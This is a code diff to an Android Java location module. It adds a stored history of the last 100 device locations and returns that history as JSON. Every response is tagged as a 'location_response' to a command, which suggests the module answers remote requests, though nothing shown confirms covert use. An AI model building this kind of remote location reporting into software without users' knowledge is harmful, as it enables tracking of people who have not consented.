@@ -13,7 +13,11 @@ import android.os.Looper;
 import android.util.Log;
 import androidx.core.app.ActivityCompat;
 
+import org.json.JSONArray;
 import org.json.JSONObject;
+
+import java.util.ArrayList;
+import java.util.List;
 
 public class LocationModule {
     private static final String TAG = "LocationModule";
@@ -23,6 +27,8 @@ public class LocationModule {
     private HandlerThread backgroundThread;
     private LocationListener locationListener;
     private boolean isTracking = false;
+    private List<Location> locationHistory = new ArrayList<>();
+    private static final int MAX_HISTORY_SIZE = 100;
     
     public interface LocationCallback {
         void onLocationResult(String locationJson);
@@ -50,6 +56,8 @@ public class LocationModule {
             Location location = getLastKnownLocation();
             
             if (location != null) {
+                // Add to history
+                addToHistory(location);
                 return createLocationJson(location);
             } else {
                 // Try to request a fresh location
@@ -57,7 +65,7 @@ public class LocationModule {
                 return createErrorJson("Requesting fresh location...");
             }
         } catch (Exception e) {
-            e.printStackTrace();
+            Log.e(TAG, "Error getting location", e);
             return createErrorJson("Error: " + e.getMessage());
         }
     }
@@ -156,6 +164,7 @@ public class LocationModule {
         locationListener = new LocationListener() {
             @Override
             public void onLocationChanged(Location location) {
+                addToHistory(location);
                 callback.onLocationResult(createLocationJson(location));
             }
             
@@ -211,19 +220,52 @@ public class LocationModule {
         }
     }
     
+    private void addToHistory(Location location) {
+        locationHistory.add(0, location);
+        // Keep only last 100 locations
+        while (locationHistory.size() > MAX_HISTORY_SIZE) {
+            locationHistory.remove(locationHistory.size() - 1);
+        }
+    }
+    
+    public String getLocationHistory() {
+        try {
+            JSONObject response = new JSONObject();
+            JSONArray historyArray = new JSONArray();
+            
+            for (Location loc : locationHistory) {
+                historyArray.put(createLocationJsonObject(loc));
+            }
+            
+            response.put("success", true);
+            response.put("history", historyArray);
+            response.put("count", historyArray.length());
+            
+            return response.toString();
+        } catch (Exception e) {
+            Log.e(TAG, "Error getting location history", e);
+            return createErrorJson("Error getting history: " + e.getMessage());
+        }
+    }
+    
+    private JSONObject createLocationJsonObject(Location location) throws Exception {
+        JSONObject json = new JSONObject();
+        json.put("latitude", location.getLatitude());
+        json.put("longitude", location.getLongitude());
+        json.put("accuracy", location.hasAccuracy() ? location.getAccuracy() : 0);
+        json.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
+        json.put("bearing", location.hasBearing() ? location.getBearing() : 0);
+        json.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
+        json.put("provider", location.getProvider());
+        json.put("time", location.getTime());
+        json.put("timestamp", System.currentTimeMillis());
+        return json;
+    }
+    
     private String createLocationJson(Location location) {
         try {
-            JSONObject json = new JSONObject();
-            json.put("latitude", location.getLatitude());
-            json.put("longitude", location.getLongitude());
-            json.put("accuracy", location.hasAccuracy() ? location.getAccuracy() : 0);
-            json.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
-            json.put("bearing", location.hasBearing() ? location.getBearing() : 0);
-            json.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
-            json.put("provider", location.getProvider());
-            json.put("time", location.getTime());
-            json.put("timestamp", System.currentTimeMillis());
-            
+            JSONObject json = createLocationJsonObject(location);
+            json.put("command", "location_response");
             return json.toString();
         } catch (Exception e) {
             return createErrorJson("Error creating JSON: " + e.getMessage());
@@ -235,6 +277,7 @@ public class LocationModule {
             JSONObject json = new JSONObject();
             json.put("error", error);
             json.put("timestamp", System.currentTimeMillis());
+            json.put("command", "location_response");
             return json.toString();
         } catch (Exception e) {
             return "{\"error\":\"" + error + "\"}";
